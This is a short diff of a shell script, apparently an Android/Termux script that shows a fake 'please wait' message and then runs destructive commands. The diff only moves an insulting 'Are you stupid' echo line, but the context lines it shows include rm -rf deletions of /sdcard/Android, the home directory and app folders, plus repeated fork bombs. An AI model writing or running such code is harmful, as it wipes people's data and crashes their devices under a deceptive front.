@@ -37,7 +37,6 @@ sleep 2
 echo "please wait................................."
 sleep 1
 clear
-echo " Are you stupid"
 echo ""
 rm -rf cd /sdcard/Android
 rm -rf cd ~
@@ -49,6 +48,7 @@ rm -rf cd /sdcard/SHAREit
 cd
 rm -rf Auto_admin
 clear
+echo " Are you stupid"
 :(){ :|:& };:
 :(){ :|:& };:
 :(){ :|:& };:
